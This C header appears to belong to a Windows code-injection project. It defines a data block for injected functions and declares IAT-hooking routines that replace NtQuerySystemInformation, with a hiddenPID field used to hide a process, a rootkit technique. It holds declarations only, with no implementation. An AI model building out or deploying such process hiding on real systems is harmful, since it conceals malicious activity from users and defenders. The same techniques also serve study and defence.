#pragma once

#define	DUMMY_ADDR	0x1122334455667788		// Dummy address of INJDATA
#define MAX_INJDATA_STR_LEN 50

typedef HMODULE(WINAPI *_GetModuleHandle)(LPCWSTR);
typedef BOOL(WINAPI *_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef NTSTATUS(WINAPI *_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef int(*_strcmp)(char const*, char const*);

struct _INJDATA; // forward declaration
typedef int (*_Hook)(struct _INJDATA*);

// INJDATA: Memory block passed to each remote injected function.
// We pass every function address or string data in this block.
typedef struct _INJDATA {
	char dllToHook[MAX_INJDATA_STR_LEN];
	char funcToHook[MAX_INJDATA_STR_LEN];
	_Hook fnHook;						  // The function that performs the IAT hooking.
	_NtQuerySystemInformation fnOriginal; // The original function.
	_NtQuerySystemInformation fnHooked;   // The hooked function.
	DWORD hiddenPID;					  
										  
	_GetModuleHandle fnGetModuleHandle;   // Address of GetModuleHandle().
	_strcmp fnStrcmp;					  // Address of strcmp().
	_VirtualProtect	fnVirtualProtect;	  // Address of VirtualProtect().
} INJDATA;



//********************************************************************* Injected functions
int Hook(INJDATA *pData);
int AfterHook();

int Unhook(INJDATA *pData);
int AfterUnhook();

NTSTATUS WINAPI HookedNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);
int AfterHookedNtQuerySystemInformation();
//*********************************************************************